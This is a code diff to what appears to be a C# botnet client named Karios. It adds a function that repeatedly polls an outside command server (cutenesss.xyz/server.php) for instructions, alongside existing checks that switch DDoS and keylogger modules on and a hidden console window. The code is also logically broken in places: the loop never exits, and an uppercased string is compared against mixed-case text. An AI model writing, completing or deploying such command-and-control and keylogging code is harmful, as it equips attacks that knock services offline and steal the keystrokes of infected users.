@@ -27,7 +27,8 @@ namespace Karios
         private static string GlobalTargetIP;
         private static string Website;
         private static bool Online = false;
-        
+        public static string commands = "";
+
         public static void Main()
         {
             var handle = GetConsoleWindow();
@@ -65,6 +66,81 @@ namespace Karios
             }
         }
 
+        private static string CommandGet()
+        {
+            try
+            {
+                string ServerAddress = "http://cutenesss.xyz/server.php";
+
+                WebClient client = new WebClient();
+
+                string Secret = "<3"; //A string to use as the version ID. Use it for testing the client.
+
+
+                //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
+                int GetIterations = -1;
+                string target = "";
+                bool Loop = true; // So we can break the loop
+                while (Loop)
+                {
+                    if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
+                    {
+                        //Log("Asking the server for commands");
+                        string paramaters = "?";
+
+                        //Tells the server that this is a client, and not a web browser
+                        if (paramaters == "?")
+                            paramaters = paramaters + "isclient=true";
+                        else
+                            paramaters = paramaters + "&isclient=true";
+
+                        //Analytical: Tells server this is a new client
+                        //(Will probably be implemented in a newer version)
+                        if (GetIterations == -1)
+                        {
+                            //Telling the server this is a new client
+                            if (paramaters == "?")
+                                paramaters = paramaters + "newclient=true";
+                            else
+                                paramaters = paramaters + "&newclient=true";
+                        }
+                        else
+                        {
+                            if (paramaters == "?")
+                                paramaters = paramaters + "newclient=false";
+                            else
+                                paramaters = paramaters + "&newclient=false";
+                        }
+
+                        //Tells the server the security hash for this version.
+                        /*
+                        if (paramaters == "?")
+                            paramaters = paramaters + "hash=" + Hash;
+                        else
+                            paramaters = paramaters + "&hash=" + Hash;
+                            */
+                        //Tells the server the client hash of this version. This will be used to protect the server from clients impersonating.
+
+                        string commands = "";
+                        try
+                        {
+                            commands = client.DownloadString(ServerAddress + paramaters);
+                        }
+                        catch (WebException web)
+                        { Console.WriteLine(web); }//TODO: Handle this Exception.
+
+                    }
+                }
+            }
+            catch { }
+
+            {
+                
+                return commands;
+            }
+        }
+
+
         private static string GetCommand()
         {
             using (WebClient wc = new WebClient())
@@ -72,13 +148,13 @@ namespace Karios
                 try
                 {
                     string webData = wc.DownloadString(""); // get rid of this cancerous website Sam -- STBoyden
-                    if (!webData.ToUpperInvariant().Contains("online"))
+                    if (!webData.ToUpperInvariant().Contains("Online"))
                     {
                         Online = true;
                     }
                     if (!webData.ToUpperInvariant().Contains("DDOS = Online"))
                     {
-                        string GetIP = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
+                        // Get DDOS IP
                     }
                     if (!webData.ToUpperInvariant().Contains("Keylogger = Online"))
                     {
